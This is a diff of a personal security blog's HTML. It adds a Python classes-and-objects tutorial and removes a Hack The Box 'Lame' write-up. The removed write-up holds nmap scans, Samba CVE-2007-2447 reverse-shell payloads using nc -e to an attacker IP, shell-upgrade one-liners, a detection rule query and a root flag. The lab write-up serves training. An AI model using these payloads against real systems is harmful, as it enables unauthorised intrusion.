+<h3 id="Classes-and-Objects"><a href="#Classes-and-Objects" class="headerlink" title="Classes and Objects"></a><strong>Classes and Objects</strong></h3><ul>
+<li><p>classes and objects are key components of object-oriented programming (OOP)</p>
+</li>
+<li><p>建立程式碼和定義自訂資料類型的方法</p>
+</li>
+<li><p>提供了一種組織程式碼、封裝資料和定義可重複使用實體的方法</p>
+</li>
+<li><p>利用繼承、多態性和封裝的原則對現實世界的實體進行建模、建立自訂資料類型並建立複雜的系統</p>
+</li>
+<li><p>Classes</p>
+<ul>
+<li>創建物件的藍圖或模板</li>
+<li>定義了該類別的物件將擁有的屬性（屬性）和行為（方法）</li>
+<li>視為建立具有相似特徵和功能的物件實例的藍圖</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:<span class="comment">#Dog 類別具有屬性 name 和age</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):<span class="comment">#__init__() 方法是一種稱為建構函數的特殊方法，在建立類別的物件時呼叫該方法</span></span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):<span class="comment">#方法 bark() 和 display_info()</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Woof!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Name:&quot;</span>, <span class="variable language_">self</span>.name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Age:&quot;</span>, <span class="variable language_">self</span>.age)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Objects</p>
+<ul>
+<li>物件是類別的實例</li>
+<li>根據類別提供的藍圖創建的</li>
+<li>每個物件都有自己的一組屬性，並且可以呼叫類別中定義的方法</li>
+<li>透過呼叫類別來建立對象，就好像它是一個函數一樣</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create objects of the Dog class</span></span><br><span class="line"><span class="comment">#dog1 和dog2 是從Dog 類別建立的物件</span></span><br><span class="line">dog1 = Dog(<span class="string">&quot;Buddy&quot;</span>, <span class="number">5</span>)</span><br><span class="line">dog2 = Dog(<span class="string">&quot;Max&quot;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#每個物件都有自己的一組屬性（名稱和年齡）</span></span><br><span class="line"><span class="comment"># Call methods on the objects</span></span><br><span class="line"><span class="comment">#可以呼叫類別中定義的方法（bark() 和 display_info()）</span></span><br><span class="line">dog1.bark()               <span class="comment"># Output: &quot;Woof!&quot;</span></span><br><span class="line">dog1.display_info()       <span class="comment"># Output: &quot;Name: Buddy&quot;, &quot;Age: 5&quot;</span></span><br><span class="line"></span><br><span class="line">dog2.bark()               <span class="comment"># Output: &quot;Woof!&quot;</span></span><br><span class="line">dog2.display_info()       <span class="comment"># Output: &quot;Name: Max&quot;, &quot;Age: 3&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Employees.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employeesss</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, department, role, salary, years_employed</span>):</span><br><span class="line">		<span class="variable language_">self</span>.name = name</span><br><span class="line">		<span class="variable language_">self</span>.department = department</span><br><span class="line">		<span class="variable language_">self</span>.role = role</span><br><span class="line">		<span class="variable language_">self</span>.salary = salary</span><br><span class="line">		<span class="variable language_">self</span>.years_employed = years_employed</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">eligible_for_retirement</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="variable language_">self</span>.years_employed &gt;= <span class="number">20</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">-----</span><br><span class="line"><span class="comment">#useobj.py</span></span><br><span class="line"><span class="keyword">from</span> Employees <span class="keyword">import</span> Employeesss</span><br><span class="line"></span><br><span class="line">e1 = Employees(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Sales&quot;</span>, <span class="string">&quot;Director of Sales&quot;</span>, <span class="number">100000</span>, <span class="number">20</span>)</span><br><span class="line">e2 = Employees(<span class="string">&quot;Linda&quot;</span>, <span class="string">&quot;Executive&quot;</span>, <span class="string">&quot;CIO&quot;</span>, <span class="number">150000</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(e1.name)<span class="comment">#Bob</span></span><br><span class="line"><span class="built_in">print</span>(e2.role)<span class="comment">#CIO</span></span><br><span class="line"><span class="built_in">print</span>(e1.eligible_for_retirement())<span class="comment">#True</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Building-a-Shoe-Budget-Tool"><a href="#Building-a-Shoe-Budget-Tool" class="headerlink" title="Building a Shoe Budget Tool"></a><strong>Building a Shoe Budget Tool</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shoes</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, price</span>):</span><br><span class="line">                <span class="variable language_">self</span>.name = name</span><br><span class="line">                <span class="variable language_">self</span>.price = <span class="built_in">float</span>(price)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">budget_check</span>(<span class="params">self, budget</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(budget, (<span class="built_in">int</span>, <span class="built_in">float</span>)):</span><br><span class="line">                    <span class="comment">#isinstance() 函數用來檢查一個物件是否是某個類別的實例</span></span><br><span class="line">                    <span class="comment">#檢查變數 budget 是否是 int 或 float 類型中的一種</span></span><br><span class="line">                    <span class="comment">#如果 budget 不是 int 或 float 類型的實例，執行下面的程式碼區塊</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;Invalid entry. Please enter a number.&#x27;</span>)</span><br><span class="line">                        exit()                </span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">self, budget</span>):</span><br><span class="line">                <span class="keyword">return</span> (budget - <span class="variable language_">self</span>.price)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">self, budget</span>):</span><br><span class="line">            <span class="comment">#用來檢查傳入的預算參數是否為有效的數字類型（即 int 或 float）</span></span><br><span class="line">                <span class="variable language_">self</span>.budget_check(budget)               </span><br><span class="line">                            </span><br><span class="line">                <span class="keyword">if</span> budget &gt;= <span class="variable language_">self</span>.price:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;You can cop some <span class="subst">&#123;self.name&#125;</span>&#x27;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> budget == <span class="variable language_">self</span>.price:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&#x27;You have exactly enough money for these shoes.&#x27;</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&#x27;You can buy these shoes and have $<span class="subst">&#123;self.change(budget)&#125;</span> left over&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                        exit(<span class="string">&#x27;Thanks for using our shoe budget app!&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shoes <span class="keyword">import</span> Shoes</span><br><span class="line"><span class="comment"># self.name = name || self.price = float(price)</span></span><br><span class="line">low = Shoes(<span class="string">&#x27;And ls&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">medium = Shoes(<span class="string">&#x27;Air Force 1s&#x27;</span>,<span class="number">120</span>)</span><br><span class="line">high = Shoes(<span class="string">&#x27;off whites&#x27;</span>,<span class="number">400</span>)</span><br><span class="line"><span class="comment">#            self.name</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    Shoes_budget = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;what is your shoe budget? &quot;</span>))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    exit(<span class="string">&quot;Pls enter a number&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Shoes <span class="keyword">in</span> [high,medium,low]:</span><br><span class="line">    Shoes.buy(Shoes_budget)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if budget &gt;= self.price:</span></span><br><span class="line"><span class="string">    print(f&#x27;You can cop some &#123;self.name&#125;&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/python]</span><br><span class="line">└─$ python3 buy.py </span><br><span class="line">what is your shoe budget? 100</span><br><span class="line">You can cop some And <span class="built_in">ls</span></span><br><span class="line">You can buy these shoes and have <span class="variable">$70</span>.0 left over</span><br><span class="line">Thanks <span class="keyword">for</span> using our shoe budget app!</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="post-Reverse" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -2984,168 +3774,6 @@
 <blockquote>
 <p>GIF89aMetaCTF{ph3ar_d3s3rial1z3d_0bj3cts} MetaCTF{ph3ar_d3s3rial1z3d_0bj3cts}</p>
 </blockquote>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="Lame-Lame" class="article article-type-Lame" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/Lame/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.086Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Lame/">
-        HTB_Lame
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/rkVBbdxa6">Nmap &amp; smbclient</a></p>
-<p>first we need to know what the Machines open service</p>
-<ul>
-<li><p>IP 10.129.108.1</p>
-</li>
-<li><p>OS Parrot</p>
-</li>
-<li><p>nmap -sV -Pn -A -sC 10.129.108.1</p>
-</li>
-<li><p>nmap -p 1-65535 -T4 -A -v 10.129.108.1</p>
-</li>
-</ul>
-<p><img src="/img/lame_Untitled.png" alt="Untitled"></p>
-<p><img src="/img/lame_Untitled_1.png" alt="Untitled"></p>
-<p><img src="/img/lame_Untitled_2.png" alt="Untitled"></p>
-<p><img src="/img/lame_Untitled_3.png" alt="Untitled"></p>
-<p><img src="/img/lame_Untitled_4.png" alt="Untitled"></p>
-<p>Now we can see the open port is:</p>
-<ul>
-<li>21&#x2F;tcp vsftpd 2.3.4 ftp service</li>
-<li>22&#x2F;tcp Openssh 4.7p1 Debian 8ubuntu1 (protocol 2.0) SSH</li>
-<li>445&#x2F;tcp Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)  netbios-ssn</li>
-</ul>
-<p>One of the FTP services allows guests to login</p>
-<p><img src="/img/lame_Untitled_5.png" alt="Untitled"></p>
-<p>So I try using anonymous login FTP service，but the content is empty</p>
-<p><img src="/img/lame_Untitled_6.png" alt="Untitled"></p>
-<p>Then I decided to look for vulnerabilities in this service version</p>
-<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49757">Offensive Security’s Exploit Database Archive</a></p>
-<p>The exploit-db  platform has seen this version of the vulnerability message </p>
-<p>And the vulnerability is <code>CVE-2011-2523</code></p>
-<p>But I find some problem, this CVE cannot be used here, becouse I use the more exploit to try this CVE, So I guess “this topic” should not apply to this vulnerability</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE">https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/nobodyatall648/CVE-2011-2523">https://github.com/nobodyatall648/CVE-2011-2523</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/0xSojalSec/-CVE-2011-2523">https://github.com/0xSojalSec/-CVE-2011-2523</a></li>
-</ul>
-<p>Back to what I said earlier, in addition to FTP services, there are also SSH and SMB services</p>
-<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-430455/Openbsd-Openssh-4.7p1.html">Openbsd Openssh version 4.7p1 : Security vulnerabilities</a></p>
-<p>After searching for vulnerabilities in this version of SSH, I found no exploitable vulnerabilities, so I directly tested the SMB service</p>
-<p>The SMB service has two ports opened</p>
-<p><img src="/img/lame_Untitled_7.png" alt="Untitled"></p>
-<p>When I browsed the exploit-db platform again, I found a lot of exploitable vulnerability information after looking for the Samba service. Among them, the 445 port targeted the vulnerability of smbd 3.0.20, and I also saw this vulnerability exploit information in the platform list.</p>
-<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/16320">Offensive Security’s Exploit Database Archive</a></p>
-<p><img src="/img/lame_Untitled_8.png" alt="Untitled"></p>
-<p><img src="/img/lame_Untitled_9.png" alt="Untitled"></p>
-<p>You can see that the CVE number is 2007-2447</p>
-<p><a target="_blank" rel="noopener" href="https://www.samba.org/samba/security/CVE-2007-2447.html">Samba - Security Announcement Archive</a></p>
-<p>The exploit needs to import the suite first from smb.SMBConnection import SMBConnection</p>
-<p>So you have to download the smb for python3 first. If you use the pysmb tool, it will always report an error (for online HTB machines)</p>
-<ul>
-<li>sudo apt install python3-smb</li>
-</ul>
-<p>Because the During the OSCP exam  we can’t use MSF tool to help us complete the topic</p>
-<p>Use the exploit is the good choose, but this doesn’t work for me</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/amriunix/CVE-2007-2447">https://github.com/amriunix/CVE-2007-2447</a></p>
-<p>So I decided not to test this way</p>
-<p>(Here I changed the IP)</p>
-<p>first I want to know the smb service if I use Anonymous identity to login the SMB it can be access?</p>
-<p><img src="/img/lame_Untitled_10.png" alt="Untitled"></p>
-<p>as i guessed</p>
-<p>The smb exploit</p>
-<ul>
-<li>logon “&#x2F;&#x3D;<code>nc ‘tun0 interface IP’ 4444 -e /bin/bash</code>”</li>
-</ul>
-<p><img src="/img/lame_Untitled_11.png" alt="Untitled"></p>
-<p><img src="/img/lame_Untitled_12.png" alt="Untitled"></p>
-<p>I think this method is Failed</p>
-<p>So want to try other payload</p>
-<p><a target="_blank" rel="noopener" href="https://oscp.infosecsanyam.in/untitled/smb-enumeration">SMB Enumeration</a></p>
-<ul>
-<li><p>logon “.&#x2F;&#x3D;<code>nohup nc -e /bin/sh LHOST LPORT</code>“</p>
-<p>  <img src="/img/lame_Untitled_13.png" alt="Untitled"></p>
-</li>
-</ul>
-<p>when I use this payload, the nc well return the <strong>connect to [10.10.14.9] from (UNKNOWN) [10.129.109.152] 39109</strong> message to me</p>
-<p><img src="/img/lame_Untitled_14.png" alt="Untitled"></p>
-<p>So I decide to try some command under nc</p>
-<p><img src="/img/lame_Untitled_15.png" alt="Untitled"></p>
-<p>In order to be fully interactive in this simple reverse shell environment, I use the interactive terminal generated by Python</p>
-<ul>
-<li><p>TTY</p>
-<p>  There a command exists called <strong>tty</strong> which displays information related to <strong>terminal</strong>. The <strong>tty</strong>  command of terminal basically prints the file name of the terminal connected to standard input. <strong>tty</strong> is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system.</p>
-<p>  <a target="_blank" rel="noopener" href="https://ppfocus.com/0/teae6b945.html">Spawning A TTY Shell-逃逸 Linux 各種 Shell 來執行命令 - 人人焦點</a></p>
-</li>
-</ul>
-<p>Attackers may upgrade a simple reverse shell to a fully interactive <code>tty</code> after obtaining initial access to a host.</p>
-<p><strong>Spawning a TTY Shell</strong></p>
-<ul>
-<li>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’</li>
-<li>echo os.system(‘&#x2F;bin&#x2F;bash’)</li>
-<li>&#x2F;bin&#x2F;sh -i</li>
-<li>perl —e ‘exec “&#x2F;bin&#x2F;sh”;’</li>
-<li>perl: exec “&#x2F;bin&#x2F;sh”;</li>
-<li>ruby: exec “&#x2F;bin&#x2F;sh”</li>
-<li>lua: os.execute(‘&#x2F;bin&#x2F;sh’)</li>
-<li>exec “&#x2F;bin&#x2F;sh”</li>
-</ul>
-<p><img src="/img/lame_Untitled_16.png" alt="Untitled"></p>
-<h3 id="Rule-query"><a href="#Rule-query" class="headerlink" title="Rule query"></a>Rule query</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event.action:executed and process.name:python and</span><br><span class="line">process.args:(&quot;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&quot; or &quot;import pty;</span><br><span class="line">pty.spawn(\&quot;/bin/dash\&quot;)&quot; or &quot;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>when I execution python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’ </p>
-<p>I well got the fully interactive, it let me easy to operate</p>
-<p><img src="/img/lame_Untitled_17.png" alt="Untitled"></p>
-<ul>
-<li>cat &#x2F;root&#x2F;root.txt ⇒ ffed091dd44f75f11cb90d85bb1ca752</li>
-</ul>
-<p><img src="/img/lame_Untitled_18.png" alt="Untitled"></p>
-<p>To be honest, I searched for flag’s file for a long time, because it doesn’t have a fixed file name and location.</p>
 
       
     </div>
